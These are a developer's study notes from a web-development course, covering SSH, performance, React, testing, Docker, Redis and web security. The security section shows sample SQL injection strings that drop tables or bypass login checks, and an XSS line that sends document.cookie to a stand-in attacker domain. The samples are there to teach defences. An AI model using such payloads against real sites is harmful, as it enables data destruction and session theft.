# Junior to Senior Software Engineer

Udemy's The Complete Junior to Senior Web Developer Roadmap (2020) by Andrei Neagoie

## Section 1: Introduction

- Frontend <--> Backend
![fullstack](/images/fullstack.png)

## Section 2: SSH (Secure Shell)

- also HTTP, HTTPS, FTP protocols (communication rules between machines)
- SSH provides secure encrypted data exchange over a shell

### SSH Command

- `ssh {user}@{host}`
- `ssh root@167.99.146.57`
- digital ocean servers
- connecting to github
- access a remote computer

### How SSH Works

- Symmetrical Encryption
- Asymmetrical Encryption
- Hashing

### Symmetric Encryption

- uses one secret key for both encryption and decryption by both parties
- key exchange algorithm

### Asymmetric Encryption

- one-way relationship
- Difiie Hellman Key Exchange

### Asymmetric Encryption Resources

https://www.youtube.com/watch?v=NmM9HA2MQGI

https://www.youtube.com/watch?v=Yjrfm_oRO0w

https://www.youtube.com/watch?v=vsXMMT2CqqE&t=

https://www.youtube.com/watch?v=NF1pwjL9-DE

### 18. Hashing

- a form of cryptography used in SSH connections
- e.g., bcrypt to hash passwords
- HMAC or Hash based Message Authentication Code
- HMAC is a recipe for turning hash functions (such as MD5 or SHA256) into MACs. So HMAC-SHA256 is a specific MAC algorithm, just like QuickSort is a specific sorting algorithm.

Steps

1. Diffie-Hellman Key Exchange
2. Arrive at Symmetric Key
3. Hashing to make sure of no funny business
4. Authenticate User

### 20. SSH Into a Server

- generate public and private rsa keys
- How to add SSH keys to the `authorized_keys` of a Digital Ocean Server.
- Recommended `ssh-keygen` command: `ssh-keygen -t rsa -b 4096 -C "youremail@example.com"`
- SSH Video https://youtu.be/ORcvSkgdA58
- Setup SSH on Github https://github.com/antonykidis/Setup-ssh-for-github/blob/master/Setup-ssh-on-github.pdf

### Contribute to Open Source Projects

https://www.udemy.com/course/the-complete-junior-to-senior-web-developer-roadmap/learn/lecture/10340674#overview

## Section 3: Performance Part 1

### Three Keys to Performance

1. Front end client side
   - critical render path
   - optimized code
   - progressive web app

2. Transfer - latency
   - minimize files
   - minimize delivery

3. Back end processing
   - CDNs (content delivery networks)
   - caching
   - load balancing
   - DB scaling
   - GZIP

### Network Performance

- Honey I shrunk the files
- The traveling deliveryman

- Shrinking Files
  1. minimize text
  2. minimize images

### Image File Formats

1. JPG - complex images with lots of colors (can't do transparency), usually larger file size

2. GIF - 2 to 256 colors, with reduced color counts huge file size savings; great for small animations

3. PNG - limited colors, so smaller size, used for logos, can add transparency to them

4. SVG - vector graphics; can be expanded and keep clarity

5. HEIC - High Efficiency Image Coding, half the size of JPEG

### Image File Formats Resources:

https://99designs.com/blog/tips/image-file-types/

https://pageweight.imgix.com/

https://www.sitepoint.com/gif-png-jpg-which-one-to-use/

### Image Optimizations

Minimize Images

- Transparency: PNG
- Animations: GIF
- Colorful Images: JPG
- Simple icons, logos and illustrations: SVG
- Reduce PNG with TinyPNG
- Reduce JPG with JPEG-optimizer
- Choose simple illustrations over highly detailed photos
- Always lower JPG image quality (30-60%)
- Resize image based on its display size
- Display different sized images for different backgrounds - media queries
- Use CDNs like imigx
- Remove image metadata

jpeg-optimizer.com - didn't work for me
tinypng.com - jpeg and png files
squoosh.app (Google)

### Media Queries - responsive design:

```css
@media screen and (min-width: 900px) {
  body {
    background: url('./large-background.jpg') no-repeat center center-fixed;
    background-size: cover;
  }
}

@media screen and (max-width: 500px) {
  body {
    background: url('./large-background.jpg') no-repeat center center-fixed;
    background-size: cover;
  }
}
```

### Media Query Resources

- view and remove exif online https://www.verexif.com/en/

- Media Queries for standard devices https://css-tricks.com/snippets/css/media-queries-for-standard-devices/

- Media Queries Cheat Sheet https://gist.github.com/bartholomej/8415655

### Delivery Optimizations - The traveling deliveryman deeper dive

- reduce the number of deliveries that have to be made

- consider using flexbox and css grid (which are native) instead of downloading CSS frameworks like Bootstrap or Foundation

- similarly streamline JavaScript; don't add unnecessary libraries

- browsers have a max amount of requests and size of the request that they can make at a time (2-6)

- Max parallel requests per browser https://stackoverflow.com/questions/985431/max-parallel-http-connections-in-a-browser

- Minify your code https://www.minifier.org/

- bundle files into one e.g., https://webpack.js.org/ - a frontend dev tool  

### Critical Render Path Introduction

- DOM: Document Object Model - The DOM is an interface to an HTML document.

- CSSOM: CSS Object Model - The CSS Object Model is a set of APIs allowing the manipulation of CSS from JavaScript.

- Critical Render Path Diagram
![CRP](/images/critical-render-path.png)

### Critical Render Path 1 - HTML

- browser parses data from files and starts creating the DOM
- as the browser encounters an external resource it starts downloading those and CSS and JS files take higher priority and image files take lower priority
- load CSS files as soon as possible in the <head>
- Load <script> JS files as late as possible right before </body>
- JS requires HTML and CSS parsing before it can be run

### Critical Render Path 2 - CSS

- CSS is called render blocking because we have to wait for the CSSOM to combine with the DOM to complete the render tree.

1. Only load whatever is needed.
2. Above the fold loading (from newspapers)
3. Media Attributes
4. Less specificity

```css
/* good */
a.important {
  color: pink;
}

/* bad */
.header .nav .item .link a.important {
  color: pink;
}
```

### Critical Render Path 3 - JavaScript

- `<script>` tag immediately requested from the server

1. Load scripts asynchronously
2. Defer loading of scripts
3. Minimize DOM manipulation
4. Avoid long running JavaScript

JavaScript Loading Diagram
![JSL](/images/JavaScript-Loading-Diagram.png)

`<script>`
- app.js

`<script async>`
- add to anything that doesn't effect the DOM or CSSOM; external scripts that are not essential to the User Experience (UX)
- if core functionality requires JS

`<script defer>`
- executes after HTML has been parsed
- if core functionality does NOT require JS

Async & Defer Resource: https://stackoverflow.com/questions/10808109/script-tag-async-defer

### Tools to Test
- PageSpeed Insights https://developers.google.com/speed/pagespeed/insights/

- WebPageTest https://www.webpagetest.org/

### Performance Tools Resource List Lesson 52
- https://www.udemy.com/course/the-complete-junior-to-senior-web-developer-roadmap/learn/lecture/10210456#bookmarks
- prefetching https://css-tricks.com/prefetching-preloading-prebrowsing/

### HTTP/2 - improve network latency
- node server code example for http2 server
```JavaScript
const http2 = require('http2');

const server = http2.createSecureServer(options, (req, res) => {
  res.setHeader('Content-Type', 'text/html');
  res.send('ok');
});
```
- HTTP/2 https://developers.google.com/web/fundamentals/performance/http2/

### HTTP/3
- https://blog.cloudflare.com/http3-the-past-present-and-future/

"Premature optimization is the root of all evil."

## Section 4: React + Redux + Module Bundling

### State of Frontend Development
- Angular vs React vs Vue

- Which tool is good for the project at hand?

- Angular is a framework: an entire kitchen where everyone works, opinionated with stricter rules

- React is the oven, more flexible than Angular, teaches good JS principles

- Vue is the microwave, simpler and easier to learn

### React
1. Thinking in Components
- e.g., atoms -> molecules -> organisms -> templates -> pages

2. One Way Data Flow - from parent to children

3. Virtual DOM

4. Great React Ecosystem: npm, node, babel, webpack, etc.

### Create React App
- JSX
- Separation of Concerns in React focus on components
- Virtual DOM and making changes in the DOM based only on what changes in the component.
- `class` is a reserved word in JS, so name like this `<div className='f1 tc'>`

- React.Fragment and Semantic HTML http://blog.jmes.tech/react-fragment-and-semantic-html/

- This is really fun. I like doing this.

- State: a description of your app; an object that describes your application; state is able to change. Usually lives in the parent component.

- Props (properties) are just inputs that never change. Props are simply things that come out of state.

- children

- A parent feeds state into a child component and as soon as the child component receives a state it's a property. The child can never change that property.  

One Way Data Flow
![data flow](/images/one-way-data-flow.png)

- JSON Placeholder https://jsonplaceholder.typicode.com/

- Smart Components have state

-lifecycle methods https://reactjs.org/docs/react-component.html

Examples (executed in order)

1. Mounting
- constructor()
- render()
- componentDidMount()

2. Updating
- render()
- componentDidUpdate()

3. Unmounting
- componentWillUnmount()

`yarn build` optimizes code for production

### Error Boundary in React

### Introduction to Redux and Webpack
- bottlenecks for JS

### State Management
- can think of state as memory
- state describes how the app should look
- Redux: one massive object that holds state for our entire app and passes props down to the components.
```JavaScript
state = {
  admin: '',
  isSignedInAs: 'user',
  user: 'Mitch'
}
```

### Redux
- Good for managing large state.
- Useful for sharing data between containers.
- Predictable state management using the three principles:

#### The Three Principles of State Management
1. Single source of truth: one big object to take care of state

2. State is read only: immutability of the object that holds state.

3. Changes using pure functions: action -> reducer -> store -> make changes

#### Flux Pattern - one-way data flow
action -> dispatcher -> store (state) -> view

#### MVC - Models, Views, Controllers
action -> controller -> model(s) <--> view(s)

- Architect apps so that as they grow everything is easier to reason about and understand.

- Redux === this.state (of React)

Redux Data Flow
![redux](/images/redux-data-flow.png)

### React + Redux Popular Resources
#### Libraries
- React Router https://reacttraining.com/react-router/web/guides/philosophy
- Ramda: a practical functional library for JS programmers - https://ramdajs.com/
- Lodash: a modern JS utility library delivering modularity, performance & extras https://lodash.com/

#### Styling
- glamorous: maintainable CSS with React https://glamorous.rocks/
- styled components: visual primitives for the component age https://www.styled-components.com/
- CSS Modules: https://github.com/css-modules/css-modules

#### Framework
- Gatsby: framework based on React that helps developers build blazing fast websites and apps https://www.gatsbyjs.org/
- Next.js: for server-side rendering of apps https://nextjs.org/

#### Reusable Components
- Material-UI: react components for faster and easier web development https://material-ui.com/
- Semantic UI: Semantic is a development framework that helps create beautiful, responsive layouts using human-friendly HTML. https://semantic-ui.com/

#### Tools
- Reselect: Simple “selector” library for Redux (and others) inspired by getters in NuclearJS, subscriptions in re-frame and this proposal from speedskater. https://github.com/reduxjs/reselect
- Redux-Saga: is a library that aims to make application side effects (i.e. asynchronous things like data fetching and impure things like accessing the browser cache) easier to manage, more efficient to execute, easy to test, and better at handling failures. https://redux-saga.js.org/
- immutable-js: Immutable persistent data collections for Javascript which increase efficiency and simplicity. https://github.com/immutable-js/immutable-js

### Module Bundlers: remember that these always change
- webpack: bigger projects https://webpack.js.org/
- parcel: small project without the need for configuration https://parceljs.org/
- rollup.js: when rolling out own npm packages https://rollupjs.org/guide/en/


### webpack
- bundles your assets: modules with dependencies -> static assets

### Babel is a JavaScript compiler https://babeljs.io/

### Resources: Webpack 4 Configurator
Configuration shouldn't be hard. As time goes one, I believe we will move towards less and less configuration. Here is a great tool to make configuring your Webpack easy. Enjoy playing with it! http://web.jakoblind.no/webpack-config/

### ESLint
- ESLint: find and fix problems in your JavaScript code https://eslint.org/

### Parcel

## Section 5: Performance Part 2
- Think critically about how our programs work.
- What solution is best and what will have the longest lasting value.

### Code Optimization
- keep your JavaScript parse and compile times low

### Code Splitting
- How can we ship the least amount of JavaScript to the user.
- route based chunking (good way to do this and used more often) https://reactjs.org/docs/code-splitting.html
- component based chunking (e.g., very large homepage) https://jamie.build/react-loadable.html
- react-loadable was the recommended way for React code splitting for a long time. However, today it is not maintained any more and it is not compatible with Webpack v4+ and Babel v7+. If you use it, it is recommended to migrate to React.lazy or @loadable/component.
- `React.lazy` https://loadable-components.com/docs/loadable-vs-react-lazy/

### React Performance Optimizations
- React Developer Tools in Chrome (Highlight Updates)
- To view performance metrics for your react app:
Append `?react_perf` to your local server URL (e.g. `localhost:3000/?react_perf`) and visit that URL in a browser.

### React Performance Optimizations 2
- Shallow comparison
```JavaScript
shouldComponentUpdate(nextProps, nextState) {
  if (this.state.count !== nextState.count) {
    return true;
  }
  return false;
}

import React, { PureComponent } from 'react';

class CounterButton extends PureComponent {
  constructor() {
    super()
    this.state = {
      count: 0
    }
  }
  ```
- Why did you update https://www.npmjs.com/package/why-did-you-update

Resources: React Performance 2
To get familiar with the asynchronous nature of setState(), have a look at:

https://medium.com/@wereHamster/beware-react-setstate-is-asynchronous-ce87ef1a9cf3

https://vasanthk.gitbooks.io/react-bits/patterns/19.async-nature-of-setState.html

Finally, have a look at this tool mentioned in the previous video:

Why did you update? https://github.com/maicki/why-did-you-update

### Optimizing Code Review
1. Only load what's needed:
- Code Splitting
- Tree Shaking: removes any unused code (webpack)
https://developers.google.com/web/fundamentals/performance/optimizing-javascript/tree-shaking/

2. Avoid blocking main thread

3. Avoid Memory Leaks - avoid adding memory into our apps like unused event listeners

4. Avoid multiple re-rendering
- minimize the number of DOM manipulations

### Progressive Web Apps
- Native (mobile) apps are designed to work offline
- Progressive web apps: made to be more like native apps
- https://whatwebcando.today/
- React Native for mobile apps
- already built-in to create react-app
- lighthouse chrome extension

### Progressive Web App Resources
- "I built a PWA and published it in 3 app stores. Here's what I learned." http://debuggerdotbreak.judahgabriel.com/2018/04/13/i-built-a-pwa-and-published-it-in-3-app-stores-heres-what-i-learned/

- Progressive Web Apps on iOS are here https://medium.com/@firt/progressive-web-apps-on-ios-are-here-d00430dee3a7

- Appscope https://appsco.pe/

### PWA
- HTTPS
- App Manifest
- Service Workers

### PWA - HTTPS
- PWA checklist https://developers.google.com/web/progressive-web-apps/checklist
- Let's Encrypt is a free, automated, and open Certificate Authority https://letsencrypt.org/
- Cloudflare https://www.cloudflare.com/

### PWA - App Manifest
- `manifest.json`
- Viewport Meta Tag https://developers.google.com/web/tools/lighthouse/audits/has-viewport-meta-tag
- Favicon Generator https://realfavicongenerator.net/
- load a splash screen and icon instead of a white screen

### PWA - Service Workers
- a script that your browser runs in the background separate from the webpage web app.
- another worker that you have in the browser working in the background as a programmable proxy that allows use offline
- isServiceWorkerready? https://jakearchibald.github.io/isserviceworkerready/

Service Worker Data Flow
![service-worker](/images/service-worker.png)

- Add service worker into an existing create react app https://github.com/jeffposnick/create-react-pwa/compare/starting-point...pwa

### Accessibility
- https://www.w3.org/standards/webdesign/accessibility

### Tools to improve front end performance: https://progressivetooling.com/

## Section 6: Testing
- A method in software development where individual units of source code, assets, or programs are tested to see whether they work properly.
- another file in your project that runs in developmen only and not in production.
- TDD Test Driven Development: writing tests even before you actually write your code so that you write code based on the tests that you provide.

### Types of Tests
1. Unit Tests
2. Integration Tests
3. Automation Tests

#### Unit Tests
- most common and easiest to implement
- work on these kinds of tests 90% of the time
- tests individual functions or classes
- important to have in your application

#### Integration Tests
- how different pieces of code work together.
- e.g., whether the database works with the express app.

#### Automation Tests or UI Tests
- testing real life scenarios on the browser

### Testing Libraries
![testing-libraries](/images/testing-libraries.png)

- the scaffolding giving us the ability to use some function calls and some new methods to actually write our tests.

#### Top Three Libraries: npm install libraries
1. Jasmine
2. Jest
3. Mocha

#### Assertion Library: to test that the variables contain the expected value.
1. Jasmine - comes with its own asssertion library
2. Jest - also comes with its own assertion library
3. Chai which pairs with Mocha (BDD - Behavioral Driven Development) - https://www.chaijs.com/

#### Test Runner - allows us to run our tests
1. Jasmine includes test runner
2. Jest also includes test runner
3. Mocha has a test runner
4. Karma another test runner allows testing on the browser

- Puppeteer: a headless browser; a node library which provides high level API to control the headless version of the browser

-jsdom {;} a fake JavaScript version of the DOM

#### Mocks, Spies and Stubs
1. Jasmine comes with this
2. Jest comes with this
3. Sinon.js works with Mocha https://sinonjs.org/

-  Spies provide information about functions: how many times they were called, in what cases, and by whom.
- Stubs replace certain functions with a function to ensure that the expected behavior happens.
- Mocks fake a function or a behavior to test differentr parts of a process. Good for integration tests.

#### Code Coverage
- Istanbul library: gives a report of where tests have been implemented and where tests are missing.

#### Top 5 JavaScript Testing Frameworks
- https://www.browserstack.com/guide/top-javascript-testing-frameworks
1. Mocha
2. Jest (from facebook)
3. Jasmine
4. Karma
5. Puppeteer (Google)

#### Unique React Tools
- Snapshot from Jest
- Enzyme (Airbnb)

### Unit Tests
- cover all small pure functions of an application
- good to have small pure functions that take an input and return an output and do one thing really really well
- main principle of functional programming.
- one of the biggest benefits of functional programming versus object-oriented programming
- a pure function is a function that has no side effects like affecting another part of a program; deterministic
- most React components are mostly pure functions
- don't test the contract: the contract is the connection between things.

### Integration Tests
- all about cross communication between different units of code
- Integration tests as connecting components to see how they work together.
- More expensive, slower, take longer to write and have a lot of moving parts.

### Automation Tests (aka end to end testing)
- UI tests to simulate user behavior and make sure these scenarios actually work from the ponit of view of an end user.
- hard to implement
- sample list of services: Nightmare, TestCafe, webdriver, Cypress

### Testing Development
![testing-development](/images/testing-development.png)

### Asynchronous Tests
- Jest cheat sheet https://github.com/sapegin/jest-cheat-sheet

### Mocks and Spies
- Mock: fake the function

### Introduction to Enzyme
- from Airbnb https://airbnb.io/enzyme/

```JavaScript
import { configure } from 'enzyme';
import Adapter from 'enzyme-adapter-react-16';

configure({ adapter: new Adapter() });
```
- `import { shallow, mount, render } from 'enzyme';
import Card from './Card';
`
- 90% of the time use `shallow`
- `mount` does a full DOM render
- `render` to a static HTML

Enzyme API Reference https://airbnb.io/enzyme/docs/api/

### Snapshot Testing
- Jest Docs Regarding Snapshot Testing https://jestjs.io/docs/en/snapshot-testing
- React Docs on Test Renderer https://reactjs.org/docs/test-renderer.html
- Enzyme Cheat Sheet Setup https://devhints.io/enzyme

### Code Coverage

`npm test -- --coverage`

### Testing Stateful Components

### Testing Connected Components

### Testing Reducers
- checking our inputs with our outputs

### Testing Actions

### Resources
- Nock https://www.npmjs.com/package/nock

- SuperTest https://www.npmjs.com/package/supertest

- Lean Testing or Why Unit Tests are Worse than You Think https://blog.usejournal.com/lean-testing-or-why-unit-tests-are-worse-than-you-think-b6500139a009

## Section 7: TypeScript
### Languages
![languages](/images/languages-spectrum.png)

### Dynamic vs Static Typing
- JavaScript is a dynamic typed: don't have to say what type of variable the variable a is going to be:
`var a = 100;`

- C++ is a statically typed language: have to say what kind of type the variable is going to be:
`int a;
a = 100`

- in dynamically typed languages type checking is done during runtime

#### (Main) Pros of Statically typed languages
1. Are self-documenting
```JavaScript
function sum(a: number, b: number) {
  return a + b;
}
sum('hello', null)
```

2. Auto completion in text editor

3. Less bugs in production because catch them early

#### Cons of Statically Typed Languages
1. Code is harder to read because more complex

2. Can forget to write good tests because you trust the statically typed language to have less bugs.

3. Slower development process because you have another step

### Weakly vs Strongly Typed
- JavaScript is weakly typed (type coercion):
```JavaScript
var a = "boooyaaa"
a + 17
// "boooyaaa17"
```
- Python is strongly typed
```Python
var = "boooyaaa"
var + 17
# Throws error
```

### Static Typing in JavaScript
#### Tools
1. flow https://flow.org/ (facebook) - static type checker; built into create-react-app https://flow.org/en/docs/tools/create-react-app/
2. elm https://elm-lang.org/; own language
3. Reason ML https://reasonml.github.io/ (facebook); separate language
4. TypeScript https://www.typescriptlang.org/ (microsoft); a superset of JavaScript with its own compiler

- Their goal is to make javascript a little bit nicer a little less buggy and introduce static typing

- TypeScript the most popular and flow more popular than the newer elm and Reason ML

- Angluar is built with TypeScript and as an Angular developer you're using TypeScript by default. Also, React community is using TypeScript.

### TypeScript Compiler
- `npm i -g typescript`
- `tsc`
-`filename.ts`

- NVM (Node Version Manager) https://www.sitepoint.com/quick-tip-multiple-versions-node-nvm/

- TypeScript Editor Support https://github.com/Microsoft/TypeScript/wiki/TypeScript-Editor-Support

### TypeScript 2
- Initialize a typescript project: `tsc --init` creates a tsconfig.json file

- Watch mode: `tsc typescript.ts --watch`

### Types vs Interface
- https://medium.com/@martin_hotell/interface-vs-type-alias-in-typescript-2-7-2a8f1777af4c

### Type Assertion
- https://basarat.gitbooks.io/typescript/docs/types/type-assertion.html

### Definitely Typed https://definitelytyped.org/
- Third Party Libraries

### Create React App with TypeScript https://create-react-app.dev/docs/adding-typescript/

## Section 8: SPA (CSR) vs Server Side Rendering

### Two Major Issues with SPA
- More JS is sent to the client on the initial request, so pages become more bloated and are slower to load.

- Harder to do good SEO on a SPA.

### Client-side Rendering (CSR) vs Server-side Rendering (SSR)

### Server Side Rendering React
- see server.js file

- Need React on both the server and the browser

#### Server Side
`ReactDOMServer.renderToNodeStream()`
`ReactDOMServer.renderToString()`

#### Browser Side
`ReactDOM.hydrate()`


### CSR
#### Pros
- rich interactions
- faster response
- great user experience as a web application after initial load

#### Cons
- low SEO potential
- longer initial load

### SSR
#### Pros
- static sites
- SEO
- initial page load
- (progressive rendering)

#### Cons
- full page reloads
- slower page rendering
- many requests to server

### SSR React Libraries
- Gatsby: Blazing-fast static site generator for React https://www.gatsbyjs.org/
- next.js: full dynamic tool to build rich apps https://nextjs.org/

- Server-side vs Client-side Routing https://medium.com/@wilbo/server-side-vs-client-side-routing-71d710e9227f

- World-Class Static Hosting https://zeit.co/

#### Next.js
- Create Next App `$ npx create-next-app`

- Understand the JavaScript SEO basics https://developers.google.com/search/docs/guides/javascript-seo-basics

## Section 9: Security

### Star of Security
![security](/images/star-of-security.png)

### Injections: the most common type of attack (adding unwanted code)
- PSequel http://www.psequel.com/ (seems like old tech from 2016, I couldn't get it to work.)
- SQL Injection demo https://www.hacksplaining.com/exercises/sql-injection
- Find SQL Injection Vulnerabilities https://www.netsparker.com/scan-website-sql-injection/?utm_source=hacksplaining&utm_medium=post&utm_campaign=quizlink

```SQL
CREATE TABLE sqlinjection (
  id serial PRIMARY KEY,
  email text UNIQUE NOT NULL
);
```
- Running an SQL Injection Attack - Computerphile https://www.youtube.com/watch?v=ciNHn38EyRc

Sample SQL injection code:
- `INSERT INTO sqlinjection (email) VALUES (; DROP TABLE sqlinjection; --);`
- `' or 1=1--`
- `'; DROP TABLE users; --`

#### Fixes for Injections
1. Sanitize input
2. Parametrize Queries
3. Knex.js or other ORMS

##### Sanitize Input
- white list philosophy (or black list)
- only allow data of the expected type

##### Parameterize Queries (aka Prepared Statements)
- precompile SQL statements so can only provide the parameters
- object relational mappers: provide the requisite SQL statements
- Example: `function sqlSelect(name, email, id) {
  if(name === number)
}`

##### Object Relational Mappers (ORM)
- Knex.js http://knexjs.org/

### PostgreSQL https://coderwall.com/p/ncxdlw/start-and-stop-postgresql-manually-on-mac-os-x
- Start
`pg_ctl -D /usr/local/var/postgres -l /usr/local/var/postgres/server.log start`

- Stop
`hyosung11@HyoSungs-iMac projects % pg_ctl -D /usr/local/var/postgres stop -s -m fast
2019-12-31 15:47:57.344 EST [53638] LOG:  received fast shutdown request
2019-12-31 15:47:57.344 EST [53638] LOG:  aborting any active transactions
2019-12-31 15:47:57.345 EST [53638] LOG:  background worker "logical replication launcher" (PID 53645) exited with exit code 1
2019-12-31 15:47:57.345 EST [53640] LOG:  shutting down
2019-12-31 15:47:57.354 EST [53638] LOG:  database system is shut down
hyosung11@HyoSungs-iMac projects %`

### 3rd Party Libraries
`npm install -g nsp` - deprecated and shut down as of 9/30/2019
`nsp check # audit package.json` https://blog.npmjs.org/post/175511531085/the-node-security-platform-service-is-shutting

`npm install -g snyk`
`snyk test # audit node_modules directory`

'npm audit --audit-level high' https://medium.com/npm-inc/announcing-npm-6-5d0b1799a905

### Logging: getting information from your machine about what's happening  
- insufficient logging is a big security issue
- good logging helps to detect issues more quickly with your product

#### Logging Tools
- winston https://www.npmjs.com/package/winston - souped up console.log
- morgan https://www.npmjs.com/package/morgan - monitor server activity

### HTTPS Everywhere
- SSL/TLS Certificates
- Let's Encrypt: free, automated, and open Certificate Authority https://letsencrypt.org/
- Cloudflare: makes your SaaS products faster & safer: https://www.cloudflare.com/

### XSS (Cross-site Scripting) & CSRF (Cross-site Request Forgery)
- XSS running code across sites to different sites from my browser (as a bad actor)
- e.g., `window.location = 'haxxed.com?cookie=' + document.cookie`

- CSRF: link to malicious URL
prevent using Content Security Policy: set by npm packages

- Andrei demonstrates how to secure but does not recommend using cookies

- Do client side user validation for quick user feedback; always validate and encode user input before using. Modern frameworks escape characters to avoid XSS by default.

#### Main Points
- sanitize input
- do not use `eval()`
- do not use `document.write()`
- set Content Security Policy
- set Secure & HTTPOnly Cookies

#### Exercise Links
- XSS https://www.hacksplaining.com/exercises/xss-stored
- CSRF https://www.hacksplaining.com/exercises/csrf#/finish

#### Resources
- Content Security Policy https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
- Cookies with HTTPOnly and Secure headers https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
- Cross-site scripting for dummies https://medium.com/hackernoon/cross-site-scripting-for-dummies-be30f76fad09

### Code Secrets
- Environmental Variables: dotenv `.env` https://www.npmjs.com/package/dotenv
- Commit History: don't commit passwords, API keys, etc.

### Secure Headers
- e.g., `npm install helmet` https://www.npmjs.com/package/helmet for express

#### Secure Headers Resources
1. If you are new to HTTP: https://code.tutsplus.com/tutorials/http-the-protocol-every-web-developer-must-know-part-1--net-31177
2. To learn a little bit more about HTTP Headers: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers
3. HTTP Header Fields: https://www.tutorialspoint.com/http/http_header_fields.htm
4. Helmet package documentation: https://github.com/helmetjs/helmet

### Access Control
- controlling what authenticated users are allowed to do
- Principal of least privilege: give only enough so that people can do their work.

#### CORS: Cross-origin Resource Sharing
- https://www.npmjs.com/package/cors

### Data Management
- always have backups
- never have a single point of failure
- limit sensitive data exposure: e.g., encrypt data in transition

#### Encryption
- hashing passwords: bcrypt, scrypt, Aragon2
- pgcrypto: encrypt a few columns of your database   
- node.bcrypt.js https://www.npmjs.com/package/bcrypt
- Andrei's article from 2017 https://rangle.io/blog/how-to-store-user-passwords-and-overcome-security-threats-in-2017/

### Don't Trust Anyone
![darth-vader](/images/don't-trust-anyone.png)

- ratelimiter https://www.npmjs.com/package/ratelimiter

### Authentication
- need to confirm and be able to trust users
- e.g., multi-factor authentication

#### Hacking https://www.hacksplaining.com/lessons

#### Personal Security https://watchyourhack.com/

#### OWASP https://www.owasp.org/index.php/Main_Page

## Section 10: Code Analysis

### Setting Up Your Environment
- knex.js: Knex.js is a "batteries included" SQL query builder for Postgres, MSSQL, MySQL, MariaDB, SQLite3, Oracle, and Amazon Redshift designed to be flexible, portable, and fun to use. https://knexjs.org/
- knex.js https://www.npmjs.com/package/knex

- PostgreSQL Database
`brew install postgresql`
`brew services start postgresql`
`==> Successfully started `postgresql` (label: homebrew.mxcl.postgresql)`
`brew services stop postgresql`
`createdb 'dbname'`
`psql 'dbname'`
`psql (12.1)`
`Type "help" for help.`
`test=#`
`\q` - quit

### Brew
`brew update`
`brew doctor`
`rm '/usr/local/bin/node'`

### Full Stack Developer
![fullstack](/images/fullstack-developer.png)

### How to Analyze Code
- don't criticize code that's new to you
- when reading a codebase new to you think about high level concepts, how everything fits together and how the dots are connected
- start with the big picture and then narrow your focus

## Section 11: Docker
- how do we run our programs and apps in all environments possible?

### Containers
- nice, small boxes that can be run anywhere instead of a monolithic app that does everything.
- products composed of multiple layers (aka services)
- microservices architecture

![containers](/images/containers.png)

### Docker Containers
- wrap up the software in a complete file system that contains everything needed to run it.
- designed to run a single application on each container  
- use host operating system
- as you create more containers need to consider container orchestration which is what Kubernetes does. https://kubernetes.io/docs/concepts/overview/what-is-kubernetes/
- i.e., Docker bundles your app into an image, a stand alone executable package and executes the image inside the container completely separate from the host machine.

 ![docker](/images/docker.png)

- Docker Hub: find and use image packages https://hub.docker.com/

![development](/images/development.png)

![production](/images/production.png)

#### Dockerfile Resource
- To learn more about `bin/bash`  discussed in the previous video, have a look at this resource. https://unix.stackexchange.com/questions/398543/what-are-the-contents-of-bin-bash-and-what-do-i-do-if-i-accidentally-overwrote
- Dockerfile reference https://docs.docker.com/engine/reference/builder/#usage

### Docker Commands
- `docker build -t superawesomecontainer .`

- `docker run -it superawesomecontainer`

- remember to use the flags `-it` is a TTY command that allows us to run the docker container

- `docker run -it -d superawesomecontainer`: -d runs the container in the background without going inside of it.

- `docker ps`: see all containers that are currently running

- `docker exec -it 699762a763a5 bash`: enter the container

- `docker stop 699762a763a5`: stop the container

- Port Binding & Port Forwarding
- `docker run -it -p 3000:3000 superawesomecontainer`

### Docker Compose
- tool to orchestrate our application services during development

- `docker-compose build` https://docs.docker.com/compose/reference/build/

- 'docker-compose run smart-brain-api' https://docs.docker.com/compose/reference/run/

- everytime you change the yml file, you need to run: `docker-compose build` to re-read that file.

- `docker-compose down`: to exit and check containers running in the background and take them down

- `docker-compose up --build`: at the beginning to build and run
- then can run `docker-compose up` https://docs.docker.com/compose/reference/up/

- `volumes`: a way to have a connection or mounting of what we have on our computer to the docker container https://stackoverflow.com/questions/34809646/what-is-the-purpose-of-volume-in-dockerfile and https://www.linux.com/tutorials/docker-volumes-and-networks-compose/

- `docker-compose up -d`
- `docker-compose exec smart-brain-api bash` - puts you in the bash below
- `root@7341e630ef3a:/usr/src/smart-brain-api#`

### PostgreSQL with Docker Resources
- https://hub.docker.com/_/postgres/
- psql commands https://www.postgresql.org/docs/9.2/app-psql.html

### Other Resources
- How to Create Tables and Insert Data into SQL Databases http://joshualande.com/create-tables-sql

- `/docker-entrypoint-init.d` https://hub.docker.com/_/postgres/

## Section 12: Redis
- NoSQL database using key - value store
- in memory database that makes it super fast and very scalable
- used for short-lived data in applications like sessions

![nosql-databases](/images/nosql-databases.png)

### Database Management Systems DBMS

![backend](/images/backend.png)

![relational dbs](/images/relational-databases.png)
- use SQL with predefined schema

### NoSQL / Non-relational Databases (document-oriented)
- e.g, MongoDB query
- redis
- riak
- Cassandra
- couchDB
- Apache Hbase
- mongoDB
- Hypertable

![dbcompare](/images/dbcompare.png)

### Installing Redis https://redis.io/download

### Redis Commands https://redis.io/commands
- `src/redis-server` to run Redis
- `src/redis-cli` to enter Redis CLI
- `QUIT` exit the CLI
- `SHUTDOWN`

- `brew services start redis`
- `brew services stop redis`

- `docker- compose exec redis redis-cli`

### Redis Data Types https://redis.io/topics/data-types

#### Five major data types: strings, hashes, lists, sets, and sorted sets
- Hashes: maps between string fields and string values, so they are the perfect data type to represent objects

- Lists: Redis Lists are simply lists of strings, sorted by insertion order. It is possible to add elements to a Redis List pushing new elements on the head (on the left) or on the tail (on the right) of the list.

- Sets & Sorted Sets (cannot have duplicates)
- Sets: Redis Sets are an unordered collection of Strings. It is possible to add, remove, and test for existence of members in O(1) (constant time regardless of the number of elements contained inside the Set).
- Sorted Sets: Redis Sorted Sets are, similarly to Redis Sets, non repeating collections of Strings. The difference is that every member of a Sorted Set is associated with score, that is used in order to take the sorted set ordered, from the smallest to the greatest score. While members are unique, scores may be repeated.

## Section 13: Sessions + JWT (JSON Web Tokens)
![dbcompare](/images/dbcompare.png)

### Traditional Cookie-Based Authentication
- stateful

### Modern Token-Based Authentication
- stateless; stored in the browser
- can use JWT with multiple APIs
- work well with native mobile apps

### Authentication Resources
